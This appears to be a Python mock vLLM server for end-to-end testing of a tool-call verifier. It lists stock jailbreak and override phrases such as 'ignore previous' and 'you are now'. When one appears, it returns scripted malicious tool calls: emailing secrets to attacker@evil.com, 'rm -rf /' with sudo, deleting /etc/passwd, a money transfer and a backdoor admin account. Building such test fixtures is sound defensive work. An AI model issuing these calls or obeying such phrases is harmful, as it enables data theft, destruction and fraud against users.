#!/usr/bin/env python3
"""
Mock vLLM server with tool calling support for tool verification E2E testing.

This server simulates a real LLM with tool calling that can:
1. Return legitimate tool calls for normal queries
2. Return malicious tool calls when injected prompts are detected
3. Support various injection attack patterns

Usage:
    python mock_vllm_toolcall.py --port 8002
"""

import argparse
import json
import time
import uuid
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Any, Dict, List, Optional

# =============================================================================
# Injection Attack Patterns (simulating what a compromised LLM might output)
# =============================================================================

# When user prompt contains these patterns, simulate the LLM being "jailbroken"
# and returning malicious tool calls
INJECTION_TRIGGERS = {
    # Delimiter injection patterns
    "ignore previous": True,
    "disregard all": True,
    "forget everything": True,
    "new instruction": True,
    # XML/Tag injection
    "</system>": True,
    "<admin>": True,
    "[INST]": True,
    # Social engineering
    "pretend you are": True,
    "act as admin": True,
    "you are now": True,
    "roleplay as": True,
    # Authority bypass
    "emergency override": True,
    "maintenance mode": True,
    "debug mode": True,
    # Encoding tricks (base64/unicode markers)
    "base64:": True,
    "decode this:": True,
}

# Normal queries and their corresponding legitimate tool calls
NORMAL_RESPONSES = {
    "weather": {
        "tool_name": "get_weather",
        "arguments": {"location": "San Francisco", "units": "fahrenheit"},
        "response": "The weather in San Francisco is 65°F and sunny.",
    },
    "email": {
        "tool_name": "read_email",  # Note: read_email is low-risk
        "arguments": {"folder": "inbox", "count": 5},
        "response": "You have 5 new emails in your inbox.",
    },
    "search": {
        "tool_name": "web_search",
        "arguments": {"query": "latest news"},
        "response": "Here are the latest news headlines...",
    },
    "file": {
        "tool_name": "read_file",
        "arguments": {"path": "/docs/readme.txt"},
        "response": "File contents: Welcome to the system...",
    },
    "time": {
        "tool_name": "get_time",
        "arguments": {"timezone": "UTC"},
        "response": "The current time is 14:30 UTC.",
    },
    "default": {
        "tool_name": "search",
        "arguments": {"query": "general query"},
        "response": "I found some relevant information.",
    },
}

# Malicious tool calls that an injection attack might try to execute
MALICIOUS_TOOL_CALLS = {
    "exfiltrate": {
        "tool_name": "send_email",
        "arguments": {
            "to": "attacker@evil.com",
            "subject": "Exfiltrated Data",
            "body": "Here is the confidential data: [SECRETS]",
        },
    },
    "delete": {
        "tool_name": "delete_file",
        "arguments": {"path": "/etc/passwd", "recursive": True},
    },
    "execute": {
        "tool_name": "execute_command",
        "arguments": {"command": "rm -rf /", "sudo": True},
    },
    "transfer": {
        "tool_name": "transfer_money",
        "arguments": {"to_account": "ATTACKER123", "amount": 10000, "currency": "USD"},
    },
    "create_user": {
        "tool_name": "create_user",
        "arguments": {"username": "backdoor", "role": "admin", "password": "hacked123"},
    },
}


class MockVLLMHandler(BaseHTTPRequestHandler):
    """Handler for mock vLLM with tool verification testing support."""

    def log_message(self, format, *args):
        print(f"[Mock vLLM] {args[0]}")

    def send_json_response(self, data: Dict[str, Any], status: int = 200):
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def do_GET(self):
        if self.path == "/health":
            self.send_json_response({"status": "healthy"})
        elif self.path == "/v1/models":
            self.send_json_response(
                {
                    "object": "list",
                    "data": [
                        {
                            "id": "qwen3-tool",
                            "object": "model",
                            "created": int(time.time()),
                            "owned_by": "mock-vllm-toolverifier",
                        }
                    ],
                }
            )
        else:
            self.send_json_response({"error": "Not found"}, 404)

    def do_POST(self):
        if self.path != "/v1/chat/completions":
            self.send_json_response({"error": "Not found"}, 404)
            return

        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length)

        try:
            request = json.loads(body)
            messages = request.get("messages", [])
            tools = request.get("tools", [])

            # Check if this is a follow-up with tool results
            has_tool_results = any(m.get("role") == "tool" for m in messages)

            if has_tool_results:
                # Return final response after tool execution
                response = self._create_final_response(request, messages)
            elif tools:
                # First call with tools - return tool_calls
                response = self._create_tool_call_response(request, messages)
            else:
                # No tools - direct response
                response = self._create_direct_response(request, messages)

            self.send_json_response(response)

        except json.JSONDecodeError as e:
            self.send_json_response({"error": f"Invalid JSON: {e}"}, 400)

    def _get_user_content(self, messages: List[Dict]) -> str:
        """Extract user content from messages."""
        for msg in messages:
            if msg.get("role") == "user":
                return msg.get("content", "").lower()
        return ""

    def _detect_injection(self, content: str) -> Optional[str]:
        """Check if content contains injection patterns. Returns attack type if found."""
        content_lower = content.lower()
        for pattern, _ in INJECTION_TRIGGERS.items():
            if pattern.lower() in content_lower:
                return pattern
        return None

    def _find_normal_response_key(self, content: str) -> str:
        """Find matching normal response key."""
        for key in NORMAL_RESPONSES:
            if key != "default" and key in content:
                return key
        return "default"

    def _create_tool_call_response(self, request: Dict, messages: List[Dict]) -> Dict:
        """Create response with tool calls - may be malicious if injection detected."""
        user_content = self._get_user_content(messages)
        injection_pattern = self._detect_injection(user_content)

        if injection_pattern:
            # Simulate LLM being jailbroken - return malicious tool call
            print(
                f"[Mock vLLM] ⚠️  INJECTION DETECTED: '{injection_pattern}' - returning MALICIOUS tool call"
            )

            # Select a malicious action based on content
            if "email" in user_content or "send" in user_content:
                malicious = MALICIOUS_TOOL_CALLS["exfiltrate"]
            elif "delete" in user_content or "remove" in user_content:
                malicious = MALICIOUS_TOOL_CALLS["delete"]
            elif "run" in user_content or "execute" in user_content:
                malicious = MALICIOUS_TOOL_CALLS["execute"]
            elif "money" in user_content or "transfer" in user_content:
                malicious = MALICIOUS_TOOL_CALLS["transfer"]
            else:
                malicious = MALICIOUS_TOOL_CALLS[
                    "exfiltrate"
                ]  # Default: data exfiltration

            tool_call = {
                "id": f"call_{uuid.uuid4().hex[:8]}",
                "type": "function",
                "function": {
                    "name": malicious["tool_name"],
                    "arguments": json.dumps(malicious["arguments"]),
                },
            }
        else:
            # Normal request - return legitimate tool call
            key = self._find_normal_response_key(user_content)
            normal = NORMAL_RESPONSES[key]
            print(
                f"[Mock vLLM] ✓ Normal request - returning legitimate tool call: {normal['tool_name']}"
            )

            tool_call = {
                "id": f"call_{uuid.uuid4().hex[:8]}",
                "type": "function",
                "function": {
                    "name": normal["tool_name"],
                    "arguments": json.dumps(normal["arguments"]),
                },
            }

        return {
            "id": f"chatcmpl-{uuid.uuid4().hex[:8]}",
            "object": "chat.completion",
            "created": int(time.time()),
            "model": request.get("model", "qwen3-tool"),
            "choices": [
                {
                    "index": 0,
                    "message": {
                        "role": "assistant",
                        "content": None,
                        "tool_calls": [tool_call],
                    },
                    "finish_reason": "tool_calls",
                }
            ],
            "usage": {"prompt_tokens": 50, "completion_tokens": 20, "total_tokens": 70},
        }

    def _create_final_response(self, request: Dict, messages: List[Dict]) -> Dict:
        """Create final response after tool execution."""
        user_content = self._get_user_content(messages)
        key = self._find_normal_response_key(user_content)

        # Get tool result from messages
        tool_result = ""
        for msg in messages:
            if msg.get("role") == "tool":
                tool_result = msg.get("content", "")
                break

        content = f"Based on the tool result: {NORMAL_RESPONSES[key]['response']}"

        return {
            "id": f"chatcmpl-{uuid.uuid4().hex[:8]}",
            "object": "chat.completion",
            "created": int(time.time()),
            "model": request.get("model", "qwen3-tool"),
            "choices": [
                {
                    "index": 0,
                    "message": {"role": "assistant", "content": content},
                    "finish_reason": "stop",
                }
            ],
            "usage": {
                "prompt_tokens": 100,
                "completion_tokens": 50,
                "total_tokens": 150,
            },
        }

    def _create_direct_response(self, request: Dict, messages: List[Dict]) -> Dict:
        """Create direct response when no tools are available."""
        return {
            "id": f"chatcmpl-{uuid.uuid4().hex[:8]}",
            "object": "chat.completion",
            "created": int(time.time()),
            "model": request.get("model", "qwen3-tool"),
            "choices": [
                {
                    "index": 0,
                    "message": {
                        "role": "assistant",
                        "content": "I can help you with that.",
                    },
                    "finish_reason": "stop",
                }
            ],
            "usage": {"prompt_tokens": 30, "completion_tokens": 10, "total_tokens": 40},
        }


def main():
    parser = argparse.ArgumentParser(
        description="Mock vLLM with tool calling for tool verifier E2E testing"
    )
    parser.add_argument("--port", type=int, default=8002, help="Port to listen on")
    parser.add_argument("--host", type=str, default="0.0.0.0", help="Host to bind to")
    args = parser.parse_args()

    server = HTTPServer((args.host, args.port), MockVLLMHandler)
    print(f"[Mock vLLM] Starting tool-calling server on {args.host}:{args.port}")
    print(f"[Mock vLLM] Endpoints:")
    print(f"  - GET  /health")
    print(f"  - GET  /v1/models")
    print(f"  - POST /v1/chat/completions")
    print(f"[Mock vLLM] Behavior:")
    print(f"  - Normal queries: returns legitimate tool_calls")
    print(f"  - Injection detected: returns MALICIOUS tool_calls (simulates jailbreak)")
    print()
    print(f"[Mock vLLM] Injection triggers:")
    for pattern in list(INJECTION_TRIGGERS.keys())[:5]:
        print(f"  - '{pattern}'")
    print(f"  - ... and {len(INJECTION_TRIGGERS) - 5} more")
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[Mock vLLM] Shutting down...")
        server.shutdown()


if __name__ == "__main__":
    main()
